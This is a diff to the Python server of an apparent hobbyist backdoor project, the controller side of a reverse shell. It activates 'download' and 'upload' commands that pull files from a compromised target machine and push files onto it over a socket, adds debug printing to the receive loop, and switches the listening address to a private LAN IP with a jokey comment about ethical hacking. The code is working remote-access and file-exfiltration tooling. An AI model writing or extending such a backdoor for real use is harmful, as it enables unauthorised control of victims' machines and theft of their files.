@@ -19,8 +19,30 @@ def reliable_recv():
     while True:
         try:
             json_data += target.recv(1024)
+            # "Backdoor coding.one\ncompile-reverse.sh\nREADME.md\nremove-compile.sh\nreverse_shell.py\nserver.py\n"
+            # type(json_data_decode()) => String
+            json_data_decode = json_data.decode()
+            print(f'json_data_decode: {json_data_decode}')
+            print(f'***************************************')
+            # type(json_data_decode_strip) => String
+            #json_data_decode_strip = json_data.decode().strip()
+            #print(f'json_data_decode_strip: {json_data_decode_strip}')
+            print(f'***************************************')
+            # json_data_decode = json_data_decode.split('\n')
+            # clean_json_data = "".join(json_data_decode)
+            # print(f'clean_json_data: {clean_json_data}')
+            clean_json_data = json_data_decode.replace('\n', '')
+            print(f'clean_json_data: {clean_json_data}')
+            print(f'***************************************')
+            # Theory
             # If target.recv <= 1024 bytes
-            return json.loads(json_data.decode())
+            #return json.loads(json_data.decode())
+            #print(f'json_data_decode: {json_data_decode}')
+            
+            return json.loads(clean_json_data)
+            # **** Working ****
+            #return json.loads(json_data_decode)
+            # **** Working ****
             
         except ValueError:
             # If we get ValueError
@@ -52,6 +74,8 @@ def shell():
         # For Changing Directory using 'cd' command
         elif command[:2].strip() == 'cd' and len(command.strip()) > 1:
             continue
+        
+        # =================START - Download files ==============
         # For Downloading files from target machines
         # 'download' command has 8 CHAR
         
@@ -65,45 +89,50 @@ def shell():
                 # before sending the files to Backdoor server
                 # Backdoor server receives base64 decoded 
                 # before creating downloaded file 
-                
                                
-        # elif command[:8].strip() == 'download':
-        #     # type(command[:8].strip()) = str
+        elif command[:8].strip() == 'download':
+            # type(command[:8].strip()) = str
             
-        #     #with open(command[9:].strip(), 'wb') as file:
-        #     with open(command[9:], 'wb') as file:
-        #         print("Waiting for file data...")
-        #         result = reliable_recv()
-        #         print("File data received, Decoding...")
-        #         result_b64decode = base64.b64decode(result)
-        #         print("Decoding complete. Writing to file...")
-        #         file.write(result_b64decode)
-        #         print("File write complete! :D")
+            #with open(command[9:].strip(), 'wb') as file:
+            with open(command[9:], 'wb') as file:
+                print("Waiting for file data...")
+                result = reliable_recv()
+                print(f'Printing result\n{result}')
+                print(f'Printing type(result)\n{type(result)}')
+                print("File data received, Decoding...")
+                #result_b64decode = base64.b64decode(result)
+                print("Decoding complete. Writing to file...")
+                #file.write(result_b64decode)
+                file.write(base64.b64decode(result))
+                print("File write complete! :D")
+        # ===============END - Download files ==============
         
-        # # 'upload' command
-        #     # try: Cuz some files cannot be uploaded/downloaded
-        #     # Read from first 7 CHAR as Binary
-        #     # fin = fileName
+        
+        # ================START - Upload files=================
+        # 'upload' command
+            # try: Cuz some files cannot be uploaded/downloaded
+            # Read from first 7 CHAR as Binary
+            # fin = fileName
             
-        #     # except:
-        #         # Avoid hanging the session when
-        #         # the file cannot be uploaded/downloaded
-        # elif command[:6].strip() == 'upload':
-        #     try:
-        #         with open(command[7:], 'rb') as fin:
-        #         #with open(command[7:].strip(), 'rb') as fin:
-        #             fin_read = fin.read()
-        #             print(f'type(fin_read): ', type(fin_read))
-        #             fin_b64encode = base64.b64encode(fin_read)
-        #             reliable_send(fin_b64encode)
-        #     except:
-        #         failed = 'Failed to Upload'
-        #         reliable_send(base64.b64encode(failed))
+            # except:
+                # Avoid hanging the session when
+                # the file cannot be uploaded/downloaded
+        elif command[:6].strip() == 'upload':
+            try:
+                with open(command[7:], 'rb') as fin:
+                #with open(command[7:].strip(), 'rb') as fin:
+                    fin_read = fin.read()
+                    print(f'type(fin_read): ', type(fin_read))
+                    fin_b64encode = base64.b64encode(fin_read)
+                    reliable_send(fin_b64encode)
+            except:
+                failed = 'Failed to Upload'
+                reliable_send(base64.b64encode(failed))
+        # ================END - Upload files=================
                 
                 
         else:
-            # target.recv(1024bytes)
-            #answer = target.recv(1024)
+            # target receive 1024 bytes
             #result = target.recv(1024)
             #
             # If receiving packet > 1024 bytes => Backdoor crashes
@@ -122,7 +151,11 @@ def server():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Binding to a port
-    IP_ADDRESS = '192.168.31.138'
+    # If you're trying to bind your socket to Public IP
+    # you're crossing the boundary of Ethical Hacking ;)
+    # FBI is watching you :D
+    IP_ADDRESS = '192.168.31.127'
+    #IP_ADDRESS = '127.0.0.1'
     port = 54321
     print(f'Binding port: {port}...\n')
     s.bind((IP_ADDRESS, port))
